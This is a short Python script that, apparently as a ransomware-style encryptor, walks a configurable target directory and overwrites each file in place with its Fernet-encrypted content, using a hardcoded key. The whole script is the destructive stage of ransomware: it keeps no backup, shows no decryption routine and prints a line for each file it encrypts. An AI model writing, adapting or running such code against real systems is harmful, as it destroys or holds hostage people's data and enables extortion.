import os
import base64
from cryptography.fernet import Fernet

TARGET_DIR = r"\Change\This\Path"

KEY = b"L1UwAa8qDyhB-UCD4Ocb94ec0DjZsPQxoY6vvWSlDSQ="  # Don't Change

def encrypt_file(file_path: str, key: bytes):
    try:
        with open(file_path, "rb") as f:
            content = f.read()

        encrypted = Fernet(key).encrypt(content)

        with open(file_path, "wb") as f:
            f.write(encrypted)

        print(f"[+] Encrypted: {file_path}")

    except Exception as e:
        print(f"[!] Failed to encrypt {file_path}: {e}")


def encrypt_directory(directory: str, key: bytes):
    if not os.path.exists(directory):
        print(f"[!] Directory not found: {directory}")
        return

    print(f"\n=== Encrypting files in: {directory} ===\n")

    for filename in os.listdir(directory):
        full_path = os.path.join(directory, filename)
        if os.path.isfile(full_path):
            encrypt_file(full_path, key)

    print("\n=== DONE ===\n")


if __name__ == "__main__":
    encrypt_directory(TARGET_DIR, KEY)
